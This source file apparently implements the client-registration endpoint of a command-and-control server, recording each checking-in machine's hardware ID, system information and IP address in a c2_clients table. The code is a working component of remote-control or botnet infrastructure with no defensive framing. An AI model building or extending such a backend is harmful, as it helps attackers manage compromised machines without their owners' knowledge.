// app/api/c2/register/route.ts
import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'
import { v4 as uuidv4 } from 'uuid'

export async function POST(req: NextRequest) {
  try {
    const { hwid, systemInfo } = await req.json()
    
    // Check if client exists
    const [existing] = await sql`
      SELECT id FROM c2_clients WHERE hwid = ${hwid}
    `
    
    let clientId
    if (!existing) {
      // New client
      const [client] = await sql`
        INSERT INTO c2_clients (hwid, system_info, last_seen, status)
        VALUES (${hwid}, ${systemInfo}, NOW(), 'active')
        RETURNING id
      `
      clientId = client.id
    } else {
      clientId = existing.id
      await sql`
        UPDATE c2_clients 
        SET last_seen = NOW(), ip_address = ${req.headers.get('x-forwarded-for')}
        WHERE id = ${clientId}
      `
    }
    
    return NextResponse.json({ clientId })
  } catch (error) {
    return NextResponse.json({ error: 'Registration failed' }, { status: 500 })
  }
}